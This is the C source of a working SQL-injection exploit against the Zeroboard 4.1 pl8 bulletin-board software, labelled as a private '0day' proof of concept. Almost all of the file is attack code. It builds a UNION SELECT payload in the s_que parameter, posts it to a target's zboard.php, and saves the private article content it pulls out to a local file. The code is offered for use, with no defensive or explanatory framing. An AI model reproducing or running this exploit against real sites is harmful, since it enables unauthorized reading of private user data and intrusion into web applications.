#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <getopt.h>
#include <string.h>
#include <fcntl.h>
#include <netdb.h>
#include <sys/socket.h>

#define DESC \
"[!] Zeroboard 4.1 pl8 0day exploit. (Ver 0x01 - PoC)\n\n" \
"THIS IS NOT A PUBLIC EXPLOIT! DO NOT DISTRIBUTE!\n\n" \
"- This exploit for reading private articles.\n" \
"Exploited by indra (indra.kr \\x40 gmail.com)\n\n"

void usage(void);
char *get_hostname(char *);
int strip_header(int);
void read_private_article(void *);

const char *crlf = "\x0D\x0A\x0D\x0A";

struct attack_info {
	char *url;
	char *dst;
	char *id;
	char *output;
	unsigned long num;
	unsigned short port;
};

int main(int argc, char **argv)
{
	int c = 0, s = 0;
	static struct option opts[] =
	{
		{"url", 1, 0, 'u'},
		{"id", 1, 0, 'i'},
		{"number", 1, 0, 'n'},
		{"port", 1, 0, 'p'},
		{"output", 1, 0, 'o'},
		{"help", 0, 0, 'h'},
		{0, 0, 0, 0}
	};
	struct attack_info *info = NULL;

	if(argc == 1)
		usage();

	if((info = malloc(sizeof(struct attack_info))) == NULL) {
		fprintf(stderr, "Out of memory.\n");
		goto failed;
	}
	memset(info, 0x00, sizeof(struct attack_info));
	info->port = 80;
	info->output = "output.html";
	while(1) {
		int idx = 0;
		c = getopt_long(argc, argv, "u:i:n:p:o:h", opts, &idx);
		if(c == -1)
			break;
		switch(c) {
		case 'u':
			info->url = optarg;
			break;
		case 'i':
			info->id = optarg;
			break;
		case 'n':
			info->num = atoi(optarg);
			break;
		case 'p':
			info->port = atoi(optarg);
			break;
		case 'o':
			info->output = optarg;
			break;
		case 'h':
			usage();
			break;
		}
	}
	if(info->url == NULL || info->id == NULL || info->num == 0)
		usage();
	
	fprintf(stdout, "%s", DESC);
	if((info->dst = get_hostname(info->url)) == NULL) {
		fprintf(stderr, "[!] Illegal URL. (need for absolute web url)\n");
		goto failed;
	}
	fprintf(stdout,
		"[*] TARGET HOST: %s:%d\n"
		"[*] TARGET URL: %s/view.php?id=%s&no=%d\n"
		"[*] Reading private article....."
		, info->dst, info->port, info->url, info->id, info->num);

	read_private_article(info);
		
	free(info);
failed:
	return EXIT_FAILURE;
}

void usage(void)
{
	fprintf(stdout,
		"%s"
		"<OPTIONS>\n"
		"  -u, --url\t\t<TARGET URL>\n"
		"  -i, --id\t\t<BBS ID>\n"
		"  -n, --number\t\t<ARTICLE NUMBER>\n"
		"  -p, --port\t\t<WEB SERVER PORT (DEFAULT: 80)>\n"
		"  -o, --output\t\t<OUTPUT FILE (DEFAULT: output.html)>\n"
		"  -h, --help\t\t[Show this messages]\n", DESC);
	exit(EXIT_SUCCESS);
}

char *get_hostname(char *path)
{
	static char ret[64];
	void *ptr = NULL, *str = NULL;
	
	str = path;

	if(memcmp(path, "http://", 7) == 0)
		str = (path + 7);
	if((ptr = strchr(str, '/')) == NULL)
		ptr = str + strlen(str);
	snprintf(ret, (ptr - str) + 1, "%s", (char *)str);
	return ret;
}

int strip_header(int s)
{
	unsigned char acc = 0;
	int n = 0, len = 0, i = 0;
	char *ptr = NULL;
	char buf[1024];

	while(1) {
		memset(buf, 0x00, sizeof(buf));

		if((n = recv(s, buf, sizeof(buf) - 1, MSG_PEEK)) == 0)
			return -1;
		if((ptr = strstr(buf, crlf)) != NULL) {
			len = (ptr - buf) + 4;
			recv(s, buf, len, 0);
			goto filled;
		} else {
			for(i = 0; i < n; i++) {
				if(buf[i] == crlf[acc]) {
					acc++;
				} else {
					if(acc > 0) {
						acc = 0;
					}
				}
				if(acc > 3) {
					recv(s, buf, i, 0);
					goto filled;
				}
			}
			recv(s, buf, i, 0);
		}
	}
filled:
	return atoi(buf + 8);
}
	
void read_private_article(void *args)
{
	int s = 0, n = 0, i = 0, fd = 0, ret = 0;
	struct hostent *he = NULL;
	struct attack_info *info = NULL;
	struct sockaddr_in sin;
	char buf[1024], post_buf[512];

	info = (struct attack_info *)args;
	memset(buf, 0x00, sizeof(buf));
	memset(&sin, 0x00, sizeof(sin));
	
	snprintf(post_buf, sizeof(post_buf), 
		"s_que=1=1%%20LIMIT%%200%20"
		"UNION%%20SELECT%%201,1,1,1,1,1,1,1,1,1,1,1,1,1,name,1,1,"
		"memo,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%%20FROM%%20"
		"zetyx_board_%s%%20WHERE%%20no=%d",
		info->id, info->num);

	snprintf(buf, sizeof(buf), 
		"POST %s/zboard.php?id=%s HTTP/1.0\r\n"
		"Content-Type: Application/x-www-form-urlencoded\r\n"
		"Content-Length: %d\r\n"
		"Host: %s\r\n\r\n"
		"%s",
		info->url, info->id, strlen(post_buf), info->dst, post_buf);
	if((he = gethostbyname(info->dst)) == NULL)
		goto failed;
	if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
		goto failed;

	memcpy(&sin.sin_addr, he->h_addr, he->h_length);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(info->port);

	if(connect(s, (struct sockaddr *)&sin, sizeof(sin)) != 0)
		goto failed;
	if(send(s, buf, strlen(buf), 0) != strlen(buf))
		goto failed;

	memset(buf, 0x00, sizeof(buf));
	
	if((ret = strip_header(s)) != 200) {
		fprintf(stdout, " FAILED.\n");
		goto failed;
	} else {
		fprintf(stdout, " OK.\n");
	}

	fprintf(stdout, "[*] Saving to '%s' file.....", info->output);
	unlink(info->output);
	if((fd = open(info->output, O_RDWR|O_CREAT, 0600)) < 0) {
		fprintf(stdout, " FAILED.\n[!] Can't create output file.\n");
		goto failed;
	}
	while((n = recv(s, buf, sizeof(buf), 0)) != 0) {
		if(write(fd, buf, n) != n) {
			fprintf(stdout, " FAILED.\n[!] File write error.\n");
			goto failed;
		}
	}
	fprintf(stdout, " OK.\n");
failed:
	fprintf(stdout, "[*] Done.\n");
	close(s);
	close(fd);
	return;
}
